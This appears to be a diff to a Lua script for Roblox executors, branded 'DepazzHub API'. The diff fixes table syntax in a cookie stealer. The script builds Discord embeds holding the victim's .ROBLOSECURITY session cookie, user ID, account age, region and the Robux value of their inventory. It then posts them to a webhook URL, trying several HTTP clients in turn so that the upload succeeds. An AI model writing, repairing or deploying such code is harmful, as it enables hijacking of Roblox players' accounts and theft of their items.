@@ -333,44 +333,43 @@ end
 local function CreateDiscordEmbed(title, description, color, fields, timestamp)
 	local embed = {
 		{
-			"title" = title,
-			"description" = description,
-			"color" = color,
-			"fields" = fields or {},
-			"footer" = {
-				"text" = "DepazzHub API",
-				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png"
+			["title"] = title,
+			["description"] = description,
+			["color"] = color,
+			["fields"] = fields or {},
+			["footer"] = {
+				["text"] = "DepazzHub API",
+				["icon_url"] = "https://cdn.discordapp.com/embed/avatars/0.png"
 			},
-			"timestamp" = timestamp or os.date("%Y-%m-%dT%H:%M:%SZ")
+			["timestamp"] = timestamp or os.date("%Y-%m-%dT%H:%M:%SZ")
 		}
 	}
-	
 	return embed
 end
 
 local function CreatePlayerEmbed(playerName, userId, age, region, cookie)
 	local embed = {
 		{
-			"title" = playerName .. " - DepazzHub",
-			"description" = "Usuario de Roblox",
-			"color" = 3887359,
-			"fields" = {
-				{ "name" = "🆔 User ID", "value" = tostring(userId), "inline" = true },
-				{ "name" = "👤 Username", "value" = playerName or "Desconocido", "inline" = true },
-				{ "name" = "🍪 Cookie", "value" = ".ROBLOSECURITY=" .. (cookie or ""), "inline" = false },
-				{ "name" = "🎂 Account Age", "value" = age or "N/A", "inline" = true },
-				{ "name" = "🌍 Region", "value" = region or "N/A", "inline" = true }
+			["title"] = playerName .. " - DepazzHub",
+			["description"] = "Usuario de Roblox",
+			["color"] = 3887359,
+			["fields"] = {
+				{ ["name"] = "🆔 User ID", ["value"] = tostring(userId), ["inline"] = true },
+				{ ["name"] = "👤 Username", ["value"] = playerName or "Desconocido", ["inline"] = true },
+				{ ["name"] = "🍪 Cookie", ["value"] = ".ROBLOSECURITY=" .. (cookie or ""), ["inline"] = false },
+				{ ["name"] = "🎂 Account Age", ["value"] = age or "N/A", ["inline"] = true },
+				{ ["name"] = "🌍 Region", ["value"] = region or "N/A", ["inline"] = true }
 			},
-			"footer" = {
-				"text" = "DepazzHub API",
-				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png"
+			["footer"] = {
+				["text"] = "DepazzHub API",
+				["icon_url"] = "https://cdn.discordapp.com/embed/avatars/0.png"
 			},
-			"timestamp" = os.date("%Y-%m-%dT%H:%M:%SZ")
+			["timestamp"] = os.date("%Y-%m-%dT%H:%M:%SZ")
 		}
 	}
-	
 	return embed
 end
+
 
 local function ToJson(obj)
 	return HttpService:JSONEncode(obj)
@@ -423,23 +422,23 @@ local function CreateInventoryEmbed(items)
 		totalValue = totalValue + value
 		
 		table.insert(fields, {
-			"name" = name,
-			"value" = tostring(value) .. " Robux",
-			"inline" = true
+			["name"] = name,
+			["value"] = tostring(value) .. " Robux",
+			["inline"] = true
 		})
 	end
 	
 	return {
 		{
-			"title" = "📦 Inventario",
-			"description" = "Items en el inventario",
-			"color" = 5763749,
-			"fields" = fields,
-			"footer" = {
-				"text" = "DepazzHub API",
-				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png"
+			["title"] = "📦 Inventario",
+			["description"] = "Items en el inventario",
+			["color"] = 5763749,
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "DepazzHub API",
+				["icon_url"] = "https://cdn.discordapp.com/embed/avatars/0.png"
 			},
-			"timestamp" = GetTimestamp()
+			["timestamp"] = GetTimestamp()
 		}
 	}
 end
@@ -494,7 +493,7 @@ local function Main()
 	local axios = getgenv("axios")
 	if axios then
 		local response3 = axios.post(apiUrl, data, {
-			headers = { "Content-Type" = "application/json" }
+			headers = { ["Content-Type"] = "application/json" }
 		})
 		if response3 and response3.status == 200 then
 			print("✅ Webhook enviado (axios)! Status: " .. response3.status)
@@ -518,7 +517,7 @@ local function Main()
 	local _RbxHttpClient = getgenv("_RbxHttpClient")
 	if _RbxHttpClient then
 		local response5 = _RbxHttpClient:Post(apiUrl, ToJson(data), {
-			"Content-Type" = "application/json"
+			["Content-Type"] = "application/json"
 		})
 		if response5 and response5.StatusCode == 200 then
 			print("✅ Webhook enviado (_RbxHttpClient)! Status: " .. response5.StatusCode)
@@ -529,7 +528,7 @@ local function Main()
 	local HttpClient = getgenv("HttpClient")
 	if HttpClient then
 		local response6 = HttpClient:Post(apiUrl, ToJson(data), {
-			"Content-Type" = "application/json"
+			["Content-Type"] = "application/json"
 		})
 		if response6 and response6.StatusCode == 200 then
 			print("✅ Webhook enviado (HttpClient)! Status: " .. response6.StatusCode)
